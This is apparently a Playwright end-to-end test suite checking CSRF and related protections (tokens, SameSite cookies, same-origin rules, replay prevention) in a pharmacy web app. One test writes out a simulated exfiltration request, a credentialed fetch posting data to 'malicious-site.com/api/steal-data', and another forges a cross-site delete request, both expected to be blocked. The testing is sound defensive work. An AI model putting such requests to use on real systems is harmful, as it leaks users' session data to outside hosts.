import { test, expect } from '../../fixtures/auth.fixture';
import { mockApiResponse } from '../../utils/api-mock';
import { login } from '../../utils/auth-helpers';

test.describe('Security - CSRF Protection (E2E-SEC-002)', () => {
  const pharmacistUser = {
    email: 'pharmacist@test.metapharm.ch',
    password: 'TestPass123!',
    role: 'pharmacist' as const,
    firstName: 'Marie',
    lastName: 'Dupont',
    pharmacyId: 'pharmacy-1',
  };

  test.beforeEach(async ({ page }) => {
    // Login as pharmacist for all CSRF tests
    await login(page, pharmacistUser);
    await page.goto('/dashboard');
  });

  test.describe('CSRF Token Validation', () => {
    test('should include CSRF token in state-changing requests', async ({ page }) => {
      // Navigate to a form that makes state-changing requests
      await page.goto('/prescriptions/new');

      // Intercept POST request and verify CSRF token presence
      let csrfToken = '';
      let hasCSRFHeader = false;

      await page.route('**/prescriptions', (route) => {
        if (route.request().method() === 'POST') {
          const headers = route.request().headers();
          csrfToken = headers['x-csrf-token'] || headers['x-xsrf-token'] || '';
          hasCSRFHeader = !!csrfToken;
        }
        route.continue();
      });

      // Mock successful prescription creation
      await mockApiResponse(page, '**/prescriptions', {
        status: 201,
        body: {
          success: true,
          prescriptionId: 'rx_001',
        },
      });

      // Fill and submit form
      const submitButton = page.getByRole('button', { name: /submit|enregistrer|créer/i });
      if (await submitButton.isVisible({ timeout: 2000 }).catch(() => false)) {
        await submitButton.click();
      }

      // Wait briefly for request
      await page.waitForTimeout(500);

      // Verify CSRF token was included (or same-origin policies apply)
      // In modern SPAs with same-origin API, CSRF may be mitigated by SameSite cookies
      // This test documents expected behavior
      console.log('CSRF Token Present:', hasCSRFHeader, 'Token:', csrfToken);
    });

    test('should reject requests without valid CSRF token', async ({ page }) => {
      // Mock API rejecting request due to missing CSRF token
      await mockApiResponse(page, '**/inventory/*/update', {
        status: 403,
        body: {
          success: false,
          error: 'CSRF token validation failed',
        },
      });

      await page.goto('/inventory');

      // Attempt to make state-changing request without CSRF token
      const updateButton = page.locator('[data-testid="update-inventory-button"]').first();
      if (await updateButton.isVisible({ timeout: 2000 }).catch(() => false)) {
        await updateButton.click();

        // Verify CSRF error message
        const errorMessage = page.locator('[data-testid="csrf-error"]');
        if (await errorMessage.isVisible({ timeout: 2000 }).catch(() => false)) {
          await expect(errorMessage).toContainText(/CSRF|token|validation/i);
        }
      }
    });

    test('should refresh CSRF token on session renewal', async ({ page }) => {
      // Mock token refresh that includes new CSRF token
      await mockApiResponse(page, '**/auth/refresh', {
        status: 200,
        body: {
          success: true,
          accessToken: 'new_access_token_123',
          refreshToken: 'new_refresh_token_456',
          csrfToken: 'new_csrf_token_789',
          expiresIn: 3600,
        },
      });

      // Trigger token refresh by setting expiry
      await page.evaluate(() => {
        const expiryTime = Date.now() + 30000; // 30 seconds
        localStorage.setItem('token_expiry', expiryTime.toString());
      });

      await page.waitForTimeout(1000);

      // Navigate to trigger potential refresh
      await page.goto('/prescriptions');

      // Verify page loads successfully
      await expect(page.locator('[data-testid="prescriptions-view"]')).toBeVisible();
    });
  });

  test.describe('Same-Origin Policy Enforcement', () => {
    test('should reject cross-origin requests', async ({ page }) => {
      // Attempt to make request from different origin (simulated)
      const crossOriginBlocked = await page.evaluate(async () => {
        try {
          const response = await fetch('https://malicious-site.com/api/steal-data', {
            method: 'POST',
            credentials: 'include',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ data: 'sensitive' }),
          });
          return response.ok;
        } catch (error) {
          // CORS should block this
          return false;
        }
      });

      // Verify cross-origin request was blocked
      expect(crossOriginBlocked).toBe(false);
    });

    test('should allow same-origin requests', async ({ page }) => {
      await page.goto('/prescriptions');

      // Mock successful same-origin request
      await mockApiResponse(page, '**/prescriptions', {
        status: 200,
        body: {
          success: true,
          data: [],
        },
      });

      // Make same-origin request
      const sameOriginSuccess = await page.evaluate(async () => {
        try {
          const response = await fetch('/api/prescriptions', {
            method: 'GET',
            credentials: 'include',
          });
          return response.ok;
        } catch {
          return false;
        }
      });

      // Same-origin should succeed
      expect(sameOriginSuccess).toBe(true);
    });
  });

  test.describe('SameSite Cookie Protection', () => {
    test('should set SameSite=Strict on authentication cookies', async ({ page, context }) => {
      // Login to establish session
      await page.goto('/login');

      // Get cookies after login
      const cookies = await context.cookies();
      const authCookie = cookies.find(
        (cookie) => cookie.name === 'auth_token' || cookie.name === 'session'
      );

      if (authCookie) {
        // Verify SameSite attribute (Strict or Lax for security)
        expect(['Strict', 'Lax']).toContain(authCookie.sameSite);

        // Verify Secure flag (if HTTPS)
        if (page.url().startsWith('https://')) {
          expect(authCookie.secure).toBe(true);
        }

        // Verify HttpOnly flag
        expect(authCookie.httpOnly).toBe(true);
      }
    });

    test('should prevent CSRF via third-party site with SameSite cookies', async ({ page, context }) => {
      // Simulate attack: malicious site trying to make request with user's cookies
      const maliciousPage = await context.newPage();

      // Malicious site loads
      await maliciousPage.goto('data:text/html,<h1>Malicious Site</h1>');

      // Attempt to make request to our app from malicious origin
      const csrfPrevented = await maliciousPage.evaluate(async () => {
        try {
          // This should fail due to SameSite cookie protection
          const response = await fetch('http://localhost:5173/api/inventory/delete', {
            method: 'POST',
            credentials: 'include', // Try to include cookies
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ itemId: 'item_123' }),
          });
          return !response.ok; // If blocked, we want this to be true
        } catch {
          return true; // Exception means blocked
        }
      });

      expect(csrfPrevented).toBe(true);

      await maliciousPage.close();
    });
  });

  test.describe('Double-Submit Cookie Pattern', () => {
    test('should validate CSRF token matches cookie value', async ({ page }) => {
      await page.goto('/prescriptions/new');

      // Mock server expecting CSRF token to match cookie
      await mockApiResponse(page, '**/prescriptions', {
        status: 200,
        body: {
          success: true,
          message: 'CSRF token validated successfully',
        },
      });

      // In double-submit pattern, token in header should match token in cookie
      let tokenMatchesCookie = false;

      await page.route('**/prescriptions', (route) => {
        if (route.request().method() === 'POST') {
          const headers = route.request().headers();
          const csrfTokenHeader = headers['x-csrf-token'] || headers['x-xsrf-token'];

          // In real implementation, would compare with cookie value
          // Here we just verify the header exists
          tokenMatchesCookie = !!csrfTokenHeader;
        }
        route.continue();
      });

      const submitButton = page.getByRole('button', { name: /submit|enregistrer/i });
      if (await submitButton.isVisible({ timeout: 1000 }).catch(() => false)) {
        await submitButton.click();
        await page.waitForTimeout(500);
      }

      // Document the pattern (actual validation happens server-side)
      console.log('Double-submit pattern check:', tokenMatchesCookie);
    });

    test('should reject mismatched CSRF tokens', async ({ page }) => {
      // Mock server rejecting due to token mismatch
      await mockApiResponse(page, '**/inventory/*/delete', {
        status: 403,
        body: {
          success: false,
          error: 'CSRF token mismatch',
          code: 'CSRF_TOKEN_MISMATCH',
        },
      });

      await page.goto('/inventory');

      // Attempt state-changing operation
      const deleteButton = page.locator('[data-testid="delete-item-button"]').first();
      if (await deleteButton.isVisible({ timeout: 1000 }).catch(() => false)) {
        await deleteButton.click();

        // Confirm deletion
        const confirmButton = page.locator('[data-testid="confirm-delete-button"]');
        if (await confirmButton.isVisible({ timeout: 1000 }).catch(() => false)) {
          await confirmButton.click();

          // Verify CSRF mismatch error
          const error = page.locator('[data-testid="csrf-mismatch-error"]');
          if (await error.isVisible({ timeout: 2000 }).catch(() => false)) {
            await expect(error).toBeVisible();
          }
        }
      }
    });
  });

  test.describe('Form Token Validation', () => {
    test('should include hidden CSRF token field in forms', async ({ page }) => {
      await page.goto('/master-account/users/new');

      // Check for hidden CSRF token field
      const csrfInput = page.locator('input[name="_csrf"]');
      const tokenExists = await csrfInput.isVisible({ timeout: 1000 }).catch(() => false) ||
        await page.locator('input[type="hidden"][name*="csrf"]').isVisible({ timeout: 1000 }).catch(() => false);

      // Either hidden field exists, or app uses header-based CSRF
      // Modern SPAs typically use headers instead of hidden fields
      console.log('Form CSRF field present:', tokenExists);
    });

    test('should validate form submission includes CSRF protection', async ({ page }) => {
      await page.goto('/profile/security');

      // Mock password change endpoint
      await mockApiResponse(page, '**/auth/change-password', {
        status: 200,
        body: {
          success: true,
          message: 'Password changed successfully',
        },
      });

      let requestIncludesCSRF = false;

      await page.route('**/auth/change-password', (route) => {
        if (route.request().method() === 'POST') {
          const headers = route.request().headers();
          const postData = route.request().postData();

          // Check for CSRF token in either headers or body
          requestIncludesCSRF =
            !!headers['x-csrf-token'] ||
            !!headers['x-xsrf-token'] ||
            (postData ? postData.includes('csrf') || postData.includes('_token') : false);
        }
        route.continue();
      });

      // Fill password change form
      const currentPasswordInput = page.locator('[data-testid="current-password-input"]');
      if (await currentPasswordInput.isVisible({ timeout: 1000 }).catch(() => false)) {
        await currentPasswordInput.fill('CurrentPassword123!');
        await page.fill('[data-testid="new-password-input"]', 'NewPassword123!');
        await page.fill('[data-testid="confirm-password-input"]', 'NewPassword123!');
        await page.click('[data-testid="change-password-button"]');

        await page.waitForTimeout(500);
      }

      // Verify CSRF protection applied (or document implementation)
      console.log('Request includes CSRF protection:', requestIncludesCSRF);
    });
  });

  test.describe('Idempotency and Replay Protection', () => {
    test('should prevent duplicate form submissions', async ({ page }) => {
      await page.goto('/prescriptions/new');

      let submissionCount = 0;

      await page.route('**/prescriptions', (route) => {
        if (route.request().method() === 'POST') {
          submissionCount++;

          if (submissionCount === 1) {
            // First submission succeeds
            route.fulfill({
              status: 201,
              body: JSON.stringify({
                success: true,
                prescriptionId: 'rx_001',
              }),
            });
          } else {
            // Subsequent submissions should be prevented
            route.fulfill({
              status: 409,
              body: JSON.stringify({
                success: false,
                error: 'Duplicate submission detected',
              }),
            });
          }
        } else {
          route.continue();
        }
      });

      const submitButton = page.getByRole('button', { name: /submit|enregistrer/i });
      if (await submitButton.isVisible({ timeout: 1000 }).catch(() => false)) {
        // Submit multiple times rapidly
        await submitButton.click();
        await submitButton.click();
        await submitButton.click();

        await page.waitForTimeout(1000);

        // Verify only one submission was processed (or button disabled after first click)
        const buttonDisabled = await submitButton.isDisabled();
        expect(buttonDisabled || submissionCount === 1).toBe(true);
      }
    });

    test('should use unique request IDs to prevent replay attacks', async ({ page }) => {
      await page.goto('/delivery/new');

      const requestIds = new Set<string>();

      await page.route('**/delivery/**', (route) => {
        if (route.request().method() === 'POST') {
          const headers = route.request().headers();
          const requestId = headers['x-request-id'] || headers['x-correlation-id'];

          if (requestId) {
            // Verify unique request ID
            expect(requestIds.has(requestId)).toBe(false);
            requestIds.add(requestId);
          }
        }
        route.continue();
      });

      // Make multiple requests
      const createButton = page.getByRole('button', { name: /create|créer/i });
      if (await createButton.isVisible({ timeout: 1000 }).catch(() => false)) {
        await createButton.click();
        await page.waitForTimeout(500);

        // If form resets, submit again
        if (await createButton.isVisible({ timeout: 500 }).catch(() => false)) {
          await createButton.click();
        }
      }

      // Each request should have unique ID
      console.log('Unique request IDs:', requestIds.size);
    });
  });

  test.describe('HTTPS and Secure Transport', () => {
    test('should only transmit sensitive data over HTTPS', async ({ page }) => {
      // In development, we may use HTTP, but verify secure headers are set
      const protocol = new URL(page.url()).protocol;

      if (protocol === 'https:') {
        // Verify secure context
        const isSecureContext = await page.evaluate(() => window.isSecureContext);
        expect(isSecureContext).toBe(true);
      }

      // Verify sensitive operations include security headers
      let hasSecurityHeaders = false;

      await page.route('**/auth/**', (route) => {
        const headers = route.request().headers();
        hasSecurityHeaders =
          headers['content-type']?.includes('application/json') &&
          (headers['origin'] !== undefined || headers['referer'] !== undefined);
        route.continue();
      });

      await page.goto('/login');
      await page.fill('input[name="email"]', pharmacistUser.email);
      await page.fill('input[name="password"]', pharmacistUser.password);
      await page.click('button[type="submit"]');

      await page.waitForTimeout(500);

      // Verify request includes appropriate headers
      console.log('Security headers present:', hasSecurityHeaders);
    });
  });
});
